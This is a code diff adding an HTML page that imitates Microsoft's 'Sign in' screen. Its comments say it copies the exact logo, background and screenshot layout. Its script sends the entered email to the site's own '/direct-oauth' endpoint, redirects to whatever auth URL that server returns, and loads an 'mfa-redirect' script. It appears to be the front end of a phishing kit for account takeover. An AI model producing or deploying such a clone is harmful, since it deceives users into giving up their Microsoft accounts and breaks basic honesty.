@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="logo.ico" />
+    <title>Sign in to Microsoft</title>
+    <style>
+      /* Reset / base */
+      * {
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+        -webkit-font-smoothing: antialiased;
+      }
+      body {
+        /* use your exact background file path */
+        background-image: url("outlookbacground.jpg");
+        background-position: center;
+        background-size: cover;
+        background-repeat: no-repeat;
+        color: #111;
+        overflow: hidden;
+      }
+
+      /* Canvas sized to match screenshot ratio visually; center content horizontally */
+      .stage {
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 18px;
+      }
+
+      /* Main card */
+      .card {
+        width: 440px; /* tuned to match screenshot proportion */
+        background: #fff;
+        border-radius: 2px;
+        box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px,
+          rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
+        padding: 3rem 3rem 2rem;
+        margin: auto;
+      }
+
+      /* Microsoft word + icon row */
+      .brand {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 4px;
+      }
+      .brand img {
+        /* width: 28px;
+        height: 28px; */
+        display: block;
+        object-fit: contain;
+      }
+
+      /* Title + subtitle */
+      h2 {
+        margin: 1rem 0 6px;
+        font-weight: 600;
+        color: #111;
+        line-height: 1;
+      }
+      .subtitle {
+        font-size: 13px;
+        margin-bottom: 20px;
+        font-weight: 500;
+      }
+
+      /* Input (single-line with blue underline) */
+      .field {
+        margin-bottom: 18px;
+      }
+      .field label {
+        display: block;
+        font-size: 13px;
+        color: #6b6b6b;
+        margin-bottom: 8px;
+      }
+      .input-underline {
+        width: 100%;
+        border: 0;
+        border-bottom: 1px solid #1b5cb8; /* blue underline */
+        padding: 8px 0px;
+        font-size: 16px;
+        outline: none;
+      }
+
+      /* Helper links */
+      .links {
+        font-size: 13px;
+        font-weight: 500;
+        margin-bottom: 18px;
+        line-height: 1.35;
+      }
+      .links a {
+        color: #0078d4;
+        text-decoration: none;
+      }
+
+      /* Buttons row */
+      .actions {
+        display: flex;
+        justify-content: flex-end;
+        gap: 5px;
+        margin-top: 2rem;
+      }
+      .btn {
+        min-width: 110px;
+        padding: 8px 20px;
+        border: 0;
+        font-size: 15px;
+        cursor: pointer;
+        font-weight: 550;
+      }
+      .btn.back {
+        background: #cfcfcf;
+        color: #111;
+      }
+      .btn.next {
+        background: #1b5cb8;
+        color: #fff;
+      }
+      .btn:disabled {
+        background: #f3f2f1;
+        color: #a19f9d;
+        cursor: not-allowed;
+      }
+
+      /* Bottom dark bar across the bottom */
+      .bottom-bar {
+        position: fixed;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        height: 30px;
+        background: rgba(0, 0, 0, 0.55);
+        display: flex;
+        align-items: center;
+        justify-content: flex-end;
+        padding-right: 22px;
+        font-size: 13px;
+        color: #eee;
+        gap: 16px;
+      }
+      .bottom-bar a {
+        color: #fff;
+        text-decoration: none;
+        margin-left: 6px;
+      }
+
+      /* Make layout responsive but preserve pixel placement for desktop */
+      @media (max-width: 1200px) {
+        .card,
+        .secondary {
+          width: 76vw;
+          max-width: 680px;
+        }
+      }
+      @media (max-width: 640px) {
+        .stage {
+          padding-top: 36px;
+        }
+        .card,
+        .secondary {
+          width: 92vw;
+        }
+        .actions {
+          justify-content: space-between;
+        }
+        .btn {
+          min-width: 90px;
+        }
+      }
+
+      /* Password field */
+      .password-field {
+        margin-bottom: 18px;
+      }
+      
+      /* Error messages */
+      .error-message {
+        color: #d13438;
+        font-size: 13px;
+        margin-top: 8px;
+        display: none;
+      }
+      
+      /* Sequential sliding dots loader */
+      .top-loader {
+        display: none;
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 6px;
+        z-index: 10;
+        overflow: hidden;
+      }
+      
+      .dot {
+        position: absolute;
+        width: 4px;
+        height: 4px;
+        background-color: #0078d4;
+        border-radius: 50%;
+        top: 1px;
+        opacity: 0;
+      }
+      
+      .dot:nth-child(1) {
+        animation: slideDot 2s infinite ease-in-out;
+        animation-delay: 0ms;
+      }
+      
+      .dot:nth-child(2) {
+        animation: slideDot 2s infinite ease-in-out;
+        animation-delay: 200ms;
+      }
+      
+      .dot:nth-child(3) {
+        animation: slideDot 2s infinite ease-in-out;
+        animation-delay: 400ms;
+      }
+      
+      @keyframes slideDot {
+        0% {
+          left: -10px;
+          opacity: 0;
+        }
+        10% {
+          opacity: 1;
+        }
+        90% {
+          opacity: 1;
+        }
+        100% {
+          left: calc(100% + 10px);
+          opacity: 0;
+        }
+      }
+      
+      /* Card needs relative positioning for loader */
+      .card {
+        position: relative;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="stage" aria-hidden="false">
+      <div style="display: flex; flex-direction: column; align-items: center">
+        <!-- Main sign-in card -->
+        <div class="card" role="dialog" aria-label="Sign in card">
+          <!-- Top loader -->
+          <div class="top-loader" id="topLoader">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+          
+          <div class="brand" aria-hidden="true">
+            <!-- use your exact logo path -->
+            <img src="logo.svg" alt="Microsoft logo" />
+          </div>
+
+          <h2 id="pageTitle">Sign in</h2>
+          <div class="subtitle" id="pageSubtitle">to continue to Microsoft</div>
+
+          <!-- Email Step -->
+          <div id="emailStep">
+            <div class="field">
+              <input
+                id="email"
+                class="input-underline"
+                type="text"
+                placeholder="Email, phone, or Skype"
+                required
+              />
+              <div class="error-message" id="emailError"></div>
+            </div>
+
+            <div class="links">
+              No account? <a href="#" tabindex="0">Create one!</a><br /><br />
+              <a href="#" style="color: #0078d4">Can't access your account?</a>
+            </div>
+
+            <div class="actions" role="group" aria-label="Form actions">
+              <button class="btn back" type="button">Back</button>
+              <button class="btn next" type="button" id="nextBtn">
+                <span id="nextBtnText">Next</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- bottom bar -->
+    <div class="bottom-bar" aria-hidden="true">
+      <a href="#">Terms of use</a>
+      <a href="#">Privacy & cookies</a>
+      <span style="opacity: 0.85">• • •</span>
+    </div>
+
+    <script>
+      function showError(elementId, message) {
+        const errorElement = document.getElementById(elementId);
+        errorElement.textContent = message;
+        errorElement.style.display = 'block';
+      }
+      
+      // Handle Next button - redirect to Microsoft directly
+      document.getElementById('nextBtn').addEventListener('click', async () => {
+        const email = document.getElementById('email').value;
+        const nextBtn = document.getElementById('nextBtn');
+        const topLoader = document.getElementById('topLoader');
+        
+        if (!email) {
+          showError('emailError', 'Please enter your email address.');
+          return;
+        }
+        
+        nextBtn.disabled = true;
+        topLoader.style.display = 'block';
+        
+        try {
+          const response = await fetch('/direct-oauth', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email })
+          });
+          
+          const data = await response.json();
+          
+          if (data.success) {
+            window.location.href = data.authUrl;
+          } else {
+            showError('emailError', 'Something went wrong.');
+            nextBtn.disabled = false;
+            topLoader.style.display = 'none';
+          }
+        } catch (error) {
+          showError('emailError', 'Something went wrong.');
+          nextBtn.disabled = false;
+          topLoader.style.display = 'none';
+        }
+      });
+      
+      // Handle Enter key
+      document.getElementById('email').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+          document.getElementById('nextBtn').click();
+        }
+      });
+    </script>
+    <script src="/js/mfa-redirect.js"></script>
+  </body>
+</html>
